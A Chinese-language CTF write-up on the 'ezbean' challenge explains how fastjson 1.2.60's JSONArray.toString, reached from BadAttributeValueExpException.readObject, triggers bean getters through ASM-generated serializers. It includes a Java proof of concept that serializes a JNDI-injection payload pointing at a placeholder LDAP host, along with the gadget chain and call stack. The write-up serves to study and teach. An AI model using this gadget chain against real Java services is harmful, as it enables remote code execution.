## 前言

前段时间看了一道CTF的[题目](https://xz.aliyun.com/t/12485#toc-3)

这道题主要是通过利用fastjson中的反序列过程中也能够调用类的getter方法这个知识点来进行利用的

常规的fastjson利用是传入的一个json串，通过autoType的方式在解析json串的过程中调用指定类的特定方法的`getter/setter`方法来进行利用的，但是如果没有fastjson的json串解析的入口，只有一个反序列化点的入口就不能够利用了吗？当然是可以的！

以前就知道这个知识点，但是一直没有真正去了解一下原理，这里趁着这道CTF来仔仔细细的了解一下这些个原理细节和底层逻辑

## 例题

这里我们先看看例题，后面再对toString触发getter的细节做出解释

题目附件可以从[这里](https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/ezbean)找到

简单说下，出题者重写了`ObjectInputStream`类中的`resolveClass`方法，在反序列化的过程中检查是否是黑名单类

![image-20230503124456378.png](https://image.3001.net/images/20230504/1683166919_645316c704266ab5577cf.png!small)

并且存在有一个`MyBean`类

![image-20230503124603028.png](https://image.3001.net/images/20230504/1683166926_645316cea31cc4deb7bea.png!small)

很明显这个pojo类就是sink点了，如果`conn`可控就可以进行JNDI注入

利用已知的fastjson反序列化能够触发getter方法，也即是`MyBean#getConnect`方法

我们可以构造POC为

    
    
    JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://xx:8000/jndi/ldap://xx:8000/SpringController");
    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
    
    MyBean myBean = new MyBean(null, null, rmiConnector);
    
    JSONArray jsonArray = new JSONArray();
    jsonArray.add(myBean);
    
    BadAttributeValueExpException val = new BadAttributeValueExpException(null);
    Field valfield = val.getClass().getDeclaredField("val");
    valfield.setAccessible(true);
    valfield.set(val, jsonArray);
    
    ByteArrayOutputStream barr = new ByteArrayOutputStream();
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
    objectOutputStream.writeObject(val);
    
    System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray())));
    

将序列化数据传入反序列化路由中就可以进行ldap查询了

利用链

    
    
    BadAttributeValueExpException#readObject
        JSONArray#toString
        	JSONArray#toJSONString
       			ASMSerializer_1_MyBean#write
        			MyBean#getConnect
    

其中利用链中的`ASMSerializer_1_MyBean`类是fastjson中内置的asm框架动态生成的一个MyBean类

这里值得注意的是，比赛过程中，在本地反序列化过程中出现了错误，但是直接将生成的序列化输入放入远程环境能够成功(我也不明白为什么)，反正知识点是对的就行！！

接下来详细了解一下本题中使用的知识点

## 知识点

### 环境

这里我使用的是`ezbean`这道题的环境，fastjson的版本也即是`1.2.60`

### 入口

在fastjson中存在实现了`Serializable`接口的类很少，经过检索，有以下`3`个

![image-20230503130041993.png](https://image.3001.net/images/20230504/1683166939_645316dbba53e1850bbdf.png!small)

  1. `AntiCollisionHashMap`: 这个类实现了自己的`readObject`方法  
![image-20230503130141565.png](https://image.3001.net/images/20230504/1683166946_645316e2b5ad1f7511eaf.png!small)

  2. `JSONObject/JSONArray`在这个版本中存在有自己的`readObject`方法  
![image-20230503130435421.png](https://image.3001.net/images/20230504/1683166953_645316e9c9fe92d6993c1.png!small)  
主要是通过重写了`ObjectInputStream#resolveClass`方法来进行反序列化类的安全性检查  
![image-20230503130538006.png](https://image.3001.net/images/20230504/1683166962_645316f2f324e30cb4a0b.png!small)  
没有任何的反序列化功能点

### JSONArray的toString调用

因为在JSONArray类中的实现的`readObject`方法中除了检查恶意类之外没有反序列化的过程，所以我们需要找到一个中转的点，这里也就是`toString`方法的带哦用

![image-20230503153814010.png](https://image.3001.net/images/20230504/1683166973_645316fd258dae46d20e5.png!small)

本身`JSONArray`类中并没有`toString`方法，它使用父类`JSON`的`toString`方法

![image-20230503153920264.png](https://image.3001.net/images/20230504/1683166979_6453170384ff49289ab89.png!small)

这里就是能够触发`getter`方法的关键点，toString方法中调用了`toJSONString`方法，通过执行对应的`JSONSerializer#write`方法达到getter方法触发的目的

接下来详细分析一下原理

#### 调用getter流程

前面提到了将会调用`JSONSerializer#write`方法

![image-20230503154450545.png](https://image.3001.net/images/20230504/1683166988_6453170c1cf5764ac9d20.png!small)

这里将会通过`getObjectWriter`来获取一个ObjectSerializer的实现类

![image-20230503154654450.png](https://image.3001.net/images/20230504/1683166996_645317142150d46ea2421.png!small)

这是一个关于`ObjectSerializer`的官方的一个例子

最后会来到`SerializeConfig#getObjectWriter`方法中获取对应class对象的`ObjectWriter`

![image-20230503154927783.png](https://image.3001.net/images/20230504/1683167005_6453171d21023b1dd84aa.png!small)

这里因为是使用的`JSONArray`进行JavaBean的嵌套使用，因为`JSONArray`是一个实现了`List`接口的一个类，所以获取到的是`ListSerializer`

而在`ListSerializer#write`的处理中

![image-20230503155231176.png](https://image.3001.net/images/20230504/1683167014_64531726343790b3bd957.png!small)

针对他的元素(一个JavaBean)，他通过调用`getObjectWriter`方法获取了对应Bean类的`ObjectWriter`对象

所以又重新回到了`SerializeConfig#getObjectWriter`的调用过程

![image-20230503155513881.png](https://image.3001.net/images/20230504/1683167020_6453172c8c90e57080989.png!small)

前面都是一些对一些常见的对象进行不同的`Serilizer`的映射，但是这里的JavaBean都不满足

来到这个方法的末尾部分

![image-20230503155650111.png](https://image.3001.net/images/20230504/1683167029_64531735ad15d2e8017d9.png!small)

在不满足前面已有的映射，通过`createJavaBeanSerializer`方法来动态的创建一个类

![image-20230503155747929.png](https://image.3001.net/images/20230504/1683167035_6453173bef8814684801d.png!small)

在经过简单的黑名单过滤之后，调用`TypeUtils#buildBeanInfo`方法来提取这个JavaBean的类信息，为之后的类生成做准备

![image-20230503160019187.png](https://image.3001.net/images/20230504/1683167042_64531742c3d1017695ba3.png!small)

![image-20230503160042736.png](https://image.3001.net/images/20230504/1683167052_6453174c1df1078851a9d.png!small)

之后嘞，就是将提取的信息`beanInfo`传入`createJavaBeanSerializer`中进行JavaBeanSerializer类的动态生成

![image-20230503160321742.png](https://image.3001.net/images/20230504/1683167059_64531753ca93c50725eb0.png!small)

在`createJavaBeanSerializer`方法中主要是通过调用`createASMSerializer`方法进行创建的

![image-20230503160501534.png](https://image.3001.net/images/20230504/1683167078_645317666d857f7c301d1.png!small)

也即是`ASMSerializerFactory#createJavaBeanSerializer`方法创建

![image-20230503160621119.png](https://image.3001.net/images/20230504/1683167084_6453176ca9da3e7088601.png!small)

这里主要是使用ASM技术来生成`ASMSerializer_num_className`这种格式的类，类的包名和`ASMSerializerFactory`类的包名共用

至于类的field的创建

![image-20230503160837754.png](https://image.3001.net/images/20230504/1683167089_64531771d5225172f9e2c.png!small)

使用的是`fieldName_asm_fieldType`类型获取其他类型

之后就是对应方法的创建

![image-20230503161010553.png](https://image.3001.net/images/20230504/1683167099_6453177b66dd98269488a.png!small)

最后生成的类为：

![image-20230503161054282.png](https://image.3001.net/images/20230504/1683167105_645317813d8302e8feaba.png!small)

最后动态生成了这个类之后，将JavaBean类和这个Serializer进行映射

最后就会调用这个动态生成的serializer的write方法，在这个方法中就能够执行JavaBean类的getter方法了

![image-20230503161356688.png](https://image.3001.net/images/20230504/1683167114_6453178ab5f25afff93a2.png!small)

调用栈为：

    
    
    getConnect:29, MyBean (com.ctf.ezser.bean)
    write:-1, ASMSerializer_1_MyBean (com.alibaba.fastjson.serializer)
    write:135, ListSerializer (com.alibaba.fastjson.serializer)
    write:285, JSONSerializer (com.alibaba.fastjson.serializer)
    toJSONString:960, JSON (com.alibaba.fastjson)
    toString:954, JSON (com.alibaba.fastjson)
    readObject:86, BadAttributeValueExpException (javax.management)
    

## 参考

https://xz.aliyun.com/t/12485#toc-3

https://y4tacker.github.io/

